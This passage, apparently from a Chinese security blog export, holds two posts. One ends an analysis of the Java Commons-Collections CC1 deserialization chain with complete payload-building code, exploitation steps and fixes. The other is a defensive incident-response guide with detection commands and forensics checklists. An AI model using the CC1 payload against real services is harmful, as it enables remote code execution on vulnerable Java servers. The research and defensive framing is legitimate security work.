<p>通过<code>get()</code>方法触发transform操作，结合AnnotationInvocationHandler的代理机制实现自动触发。</p>
<h3 id="4-AnnotationInvocationHandler"><a href="#4-AnnotationInvocationHandler" class="headerlink" title="4. AnnotationInvocationHandler"></a>4. AnnotationInvocationHandler</h3><p>JDK内部类（sun.reflect.annotation），其<code>readObject()</code>方法会调用<code>memberValues.entrySet()</code>，而通过动态代理机制可将<code>memberValues</code>设置为代理对象，最终触发LazyMap的get方法。</p>
<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
<li>JDK版本 &lt;&#x3D; 8u71（高版本修复了AnnotationInvocationHandler）</li>
<li>Commons-Collections 3.2.1</li>
</ul>
<h3 id="Payload构造代码"><a href="#Payload构造代码" class="headerlink" title="Payload构造代码"></a>Payload构造代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 1. 构建Transformer链</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建LazyMap代理</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 通过AnnotationInvocationHandler触发</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 生成序列化Payload</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.flush();</span><br><span class="line"><span class="type">byte</span>[] payload = bos.toByteArray();</span><br></pre></td></tr></table></figure>

<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
<li>将payload序列化后发送给目标服务</li>
<li>目标服务反序列化时触发调用链</li>
<li>最终执行<code>Runtime.getRuntime().exec()</code>打开计算器</li>
</ol>
<h2 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h2><ol>
<li><p>升级Commons-Collections到安全版本：</p>
<ul>
<li>3.x版本升级到3.2.2+</li>
<li>4.x版本升级到4.1+</li>
</ul>
</li>
<li><p>添加反序列化过滤器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> ObjectInputFilter.Config.createFilter(</span><br><span class="line">    <span class="string">&quot;!org.apache.commons.collections.functors.*&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">ObjectInputFilter.Config.setObjectInputFilter(ois, filter);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用安全的序列化库（如JSON）</p>
</li>
</ol>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>CC1链展示了Java反序列化漏洞的典型利用模式，其核心在于通过精心构造的对象关系链触发危险操作。开发人员应：</p>
<ul>
<li>及时更新第三方库版本</li>
<li>避免反序列化不可信数据</li>
<li>使用白名单机制验证反序列化类</li>
</ul>
<blockquote>
<p><strong>免责声明</strong>：本文所述技术仅供学习研究，请勿用于非法用途。</p>
</blockquote>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全应急响应流程标准化指南</title>
    <url>/2025/03/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B%E6%A0%87%E5%87%86%E5%8C%96%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h2 id="0x01-应急响应核心阶段"><a href="#0x01-应急响应核心阶段" class="headerlink" title="0x01 应急响应核心阶段"></a>0x01 应急响应核心阶段</h2><h3 id="1-准备阶段（Preparation）"><a href="#1-准备阶段（Preparation）" class="headerlink" title="1. 准备阶段（Preparation）"></a>1. 准备阶段（Preparation）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[制定应急预案] --&gt; B[组建IRT团队]</span><br><span class="line">    B --&gt; C[部署监控系统]</span><br><span class="line">    C --&gt; D[建立通信机制]</span><br><span class="line">    D --&gt; E[定期演练]</span><br></pre></td></tr></table></figure>

<p><strong>关键行动清单</strong>：</p>
<ul>
<li>编制《安全事件分类分级标准》</li>
<li>部署EDR&#x2F;XDR解决方案</li>
<li>配置SIEM日志集中管理（推荐ELK&#x2F;Splunk）</li>
<li>准备取证工具包（FTK Imager&#x2F;Autopsy&#x2F;Wireshark）</li>
</ul>
<span id="more"></span>

<h3 id="2-检测与确认（Identification）"><a href="#2-检测与确认（Identification）" class="headerlink" title="2. 检测与确认（Identification）"></a>2. 检测与确认（Identification）</h3><p><strong>入侵指标（IoC）验证流程</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 异常流量检测 -&gt; NetFlow分析</span><br><span class="line">2. 可疑进程排查 -&gt; Process Explorer</span><br><span class="line">3. 恶意文件扫描 -&gt; VirusTotal/Hybrid-Analysis</span><br><span class="line">4. 登录日志审计 -&gt; 提取4624/4625事件</span><br></pre></td></tr></table></figure>

<p><strong>快速检测指令集</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows系统快速排查</span></span><br><span class="line"><span class="built_in">Get-Process</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.CPU <span class="operator">-gt</span> <span class="number">80</span>&#125;  <span class="comment"># 高CPU进程</span></span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;ESTABLISHED&quot;</span>        <span class="comment"># 活跃连接</span></span><br><span class="line">schtasks /query /fo LIST /v                 <span class="comment"># 计划任务检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux系统快速排查</span></span><br><span class="line">lsof <span class="literal">-i</span> <span class="literal">-P</span> <span class="literal">-n</span> | grep ESTABLISHED</span><br><span class="line"><span class="built_in">ps</span> aux | awk <span class="string">&#x27;$3 &gt; 50 &#123;print $0&#125;&#x27;</span>           <span class="comment"># CPU占用Top50</span></span><br><span class="line">grep <span class="string">&quot;Accepted password&quot;</span> /var/log/auth.log  <span class="comment"># 成功登录记录</span></span><br></pre></td></tr></table></figure>

<h3 id="3-抑制与遏制（Containment）"><a href="#3-抑制与遏制（Containment）" class="headerlink" title="3. 抑制与遏制（Containment）"></a>3. 抑制与遏制（Containment）</h3><p><strong>网络隔离策略</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">防火墙策略更新：</span><br><span class="line">1. 阻断C2服务器IP（iptables/nftables）</span><br><span class="line">2. 关闭非必要端口（禁用135-139/445）</span><br><span class="line">3. VLAN隔离感染主机</span><br><span class="line"></span><br><span class="line">主机级控制：</span><br><span class="line">1. 重置用户密码（重点：域管理员账户）</span><br><span class="line">2. 吊销异常证书（certutil -store）</span><br><span class="line">3. 冻结可疑服务（sc delete [service]）</span><br></pre></td></tr></table></figure>

<p><strong>取证操作规范</strong>：</p>
<ol>
<li>使用<code>dd</code>命令创建磁盘镜像</li>
<li>内存取证（使用Belkasoft RAM Capturer）</li>
<li>文件哈希值计算（md5deep -r &#x2F;path）</li>
<li>日志文件写保护（chattr +i）</li>
</ol>
<h3 id="4-根除与恢复（Eradication-Recovery）"><a href="#4-根除与恢复（Eradication-Recovery）" class="headerlink" title="4. 根除与恢复（Eradication &amp; Recovery）"></a>4. 根除与恢复（Eradication &amp; Recovery）</h3><p><strong>恶意软件清理清单</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows注册表关键位置：</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Services</span><br><span class="line"></span><br><span class="line">Linux持久化位置：</span><br><span class="line">~/.ssh/authorized_keys</span><br><span class="line">/etc/crontab</span><br><span class="line">/var/spool/cron/</span><br></pre></td></tr></table></figure>

<p><strong>安全恢复检查表</strong>：</p>
<ul>
<li>验证备份完整性（使用sha256sum）</li>
<li>重建系统镜像（基于Golden Image）</li>
<li>更新防病毒特征库</li>
<li>重置所有用户会话（特别是RDP&#x2F;SSH）</li>
</ul>
<h3 id="5-事后分析（Post-Incident-Analysis）"><a href="#5-事后分析（Post-Incident-Analysis）" class="headerlink" title="5. 事后分析（Post-Incident Analysis）"></a>5. 事后分析（Post-Incident Analysis）</h3><p><strong>攻击时间线重建模板</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">时间戳,事件类型,源IP,目标IP,操作类型</span><br><span class="line">2023-08-20T14:22:01Z,Network,192.168.1.100,10.0.0.5,PortScan</span><br><span class="line">2023-08-20T14:25:17Z,Host,10.0.0.5,N/A,RegistryModify</span><br></pre></td></tr></table></figure>

<p><strong>改进措施矩阵</strong>：</p>
<table>
<thead>
<tr>
<th align="left">漏洞类型</th>
<th align="left">修复方案</th>
<th align="left">负责人</th>
<th align="left">完成时限</th>
</tr>
</thead>
<tbody><tr>
<td align="left">未修复漏洞</td>
<td align="left">部署虚拟补丁（IPS规则ID:3056）</td>
<td align="left">安全组</td>
<td align="left">24h</td>
</tr>
<tr>
<td align="left">弱口令问题</td>
<td align="left">实施双因素认证（Duo集成）</td>
<td align="left">运维组</td>
<td align="left">72h</td>
</tr>
<tr>
<td align="left">日志存储不足</td>
<td align="left">扩容ELK集群至5节点</td>
<td align="left">基础架构</td>
<td align="left">7d</td>
</tr>
</tbody></table>
<h2 id="0x02-应急响应工具集"><a href="#0x02-应急响应工具集" class="headerlink" title="0x02 应急响应工具集"></a>0x02 应急响应工具集</h2><h3 id="网络取证工具"><a href="#网络取证工具" class="headerlink" title="网络取证工具"></a>网络取证工具</h3><table>
<thead>
<tr>
<th align="left">工具名称</th>
<th align="left">用途</th>
<th align="left">下载链接</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NetworkMiner</td>
<td align="left">PCAP文件分析</td>
<td align="left"><a href="https://www.netresec.com/">https://www.netresec.com</a></td>
</tr>
<tr>
<td align="left">Zeek</td>
<td align="left">网络流量元数据提取</td>
<td align="left"><a href="https://zeek.org/">https://zeek.org</a></td>
</tr>
<tr>
<td align="left">Stenographer</td>
<td align="left">全流量捕获系统</td>
<td align="left"><a href="https://github.com/google/stenographer">https://github.com/google/stenographer</a></td>
</tr>
<tr>
<td align="left">Wireshark</td>
<td align="left">PCAP文件分析,网络流量元数据提取</td>
<td align="left"><a href="https://www.wireshark.org/">https://www.wireshark.org/</a></td>
</tr>
</tbody></table>
<h3 id="主机取证工具"><a href="#主机取证工具" class="headerlink" title="主机取证工具"></a>主机取证工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Volatility - 内存分析框架（支持300+插件）</span><br><span class="line">2. Redline - 主机IoC深度扫描</span><br><span class="line">3. Sleuth Kit - 磁盘镜像分析套件</span><br></pre></td></tr></table></figure>

<h2 id="0x03-事件报告模板"><a href="#0x03-事件报告模板" class="headerlink" title="0x03 事件报告模板"></a>0x03 事件报告模板</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安全事件报告（编号：IR-20230820）</span><br><span class="line"></span><br><span class="line">## 1. 事件摘要</span><br><span class="line">- 发现时间：2023-08-20 14:30 UTC</span><br><span class="line">- 影响范围：3台Web服务器（10.0.0.5-7）</span><br><span class="line">- 事件等级：P1（重大）</span><br><span class="line"></span><br><span class="line">## 2. 技术细节</span><br><span class="line">​```json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;攻击向量&quot;: &quot;WebShell上传（/uploads/cmd.jsp）&quot;,</span><br><span class="line">    &quot;利用漏洞&quot;: &quot;CVE-2023-12345（Apache Struts2 RCE）&quot;,</span><br><span class="line">    &quot;横向移动&quot;: [</span><br><span class="line">        &quot;PsExec传播&quot;,</span><br><span class="line">        &quot;Mimikatz凭证窃取&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-改进计划"><a href="#3-改进计划" class="headerlink" title="3. 改进计划"></a>3. 改进计划</h2><ul>
<li>部署WAF规则阻断异常User-Agent（ETA:2023-08-25）</li>
<li>实施应用白名单（Carbon Black）</li>
</ul>
<hr>
<h2 id="0x04-常见问题解答（FAQ）"><a href="#0x04-常见问题解答（FAQ）" class="headerlink" title="0x04 常见问题解答（FAQ）"></a>0x04 常见问题解答（FAQ）</h2><p><strong>Q1：如何判断事件是否完全处理？</strong>  </p>
<blockquote>
<p>需同时满足：  </p>
<ol>
<li>所有IoC清除验证  </li>
<li>监控系统72小时无告警  </li>
<li>攻击入口完成加固</li>
</ol>
</blockquote>
<p><strong>Q2：是否需要执法部门介入？</strong>  </p>
<blockquote>
<p>当符合以下条件时需报警：  </p>
<ul>
<li>数据泄露超过1000人  </li>
<li>涉及金融欺诈  </li>
<li>关键基础设施受影响</li>
</ul>
</blockquote>
<p><strong>Q3：如何预防同类事件？</strong>  </p>
<blockquote>
<p>推荐实施：  </p>
<ul>
<li>定期红蓝对抗演练  </li>
<li>部署欺骗防御系统（如Thinkst Canary）  </li>
<li>建立威胁情报订阅机制</li>
</ul>
</blockquote>
<blockquote>
<p><strong>法律声明</strong>：本流程文档仅供参考，具体操作需根据实际环境调整，实施前请进行合规性审查。</p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
</search>
